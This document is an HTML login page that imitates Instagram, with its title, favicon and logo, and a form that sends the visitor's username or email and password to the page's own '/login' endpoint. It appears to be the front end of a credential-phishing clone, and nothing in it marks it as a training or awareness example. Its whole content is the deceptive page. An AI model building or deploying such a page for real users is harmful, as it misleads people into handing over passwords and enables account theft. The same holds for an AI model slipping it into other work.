<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <link rel="stylesheet" href="/static/style.css">
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram" class="logo">
            <form action="/login" method="post">
                <input type="text" name="email" placeholder="Phone number, username, or email" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Log In</button>
            </form>
            <div class="divider"><span>OR</span></div>
            <div class="fb-login">Log in with Facebook</div>
            <div class="forgot"><a href="#">Forgot password?</a></div>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
